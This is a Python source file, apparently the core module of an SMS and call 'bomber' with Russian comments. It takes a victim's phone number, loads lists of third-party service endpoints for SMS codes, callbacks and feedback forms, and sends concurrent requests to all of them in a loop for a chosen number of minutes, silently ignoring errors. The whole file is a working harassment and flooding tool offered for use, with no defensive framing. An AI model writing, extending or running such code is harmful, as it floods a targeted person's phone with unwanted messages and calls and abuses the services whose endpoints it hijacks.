from asyncio import ensure_future, gather, run, Event
from aiohttp import ClientSession

from Core.Attack.Services import urls
from Core.Attack.Feedback_Services import feedback_urls

# Глобальный флаг для остановки атак
stop_event = Event()

async def request(session, url, attack_type):
    try:
        if stop_event.is_set():
            return

        # Определяем какие типы запросов шлём
        if attack_type == "MIX":
            allowed = ("SMS", "CALL", "FEEDBACK")
        elif attack_type == "SMS":
            allowed = ("SMS",)
        elif attack_type == "CALL":
            allowed = ("CALL",)
        else:
            allowed = ("SMS", "CALL", "FEEDBACK")

        if url['info']['attack'] in allowed:
            async with session.request(
                url['method'],
                url['url'],
                params=url.get('params'),
                cookies=url.get('cookies'),
                headers=url.get('headers'),
                data=url.get('data'),
                json=url.get('json'),
                timeout=20
            ) as response:
                return await response.text()
    except:
        pass

async def async_attacks(number, attack_type):
    async with ClientSession() as session:
        services = urls(number)  # SMS + CALL
        tasks = [ensure_future(request(session, s, attack_type)) for s in services]
        await gather(*tasks)

def start_async_attacks(number, minutes, attack_type="MIX"):
    import time
    start_time = time.time()
    duration = float(minutes) * 60
    while True:
        if stop_event.is_set():
            break
        elapsed = time.time() - start_time
        if elapsed >= duration:
            break
        run(async_attacks(number, attack_type))

def stop_attacks():
    stop_event.set()
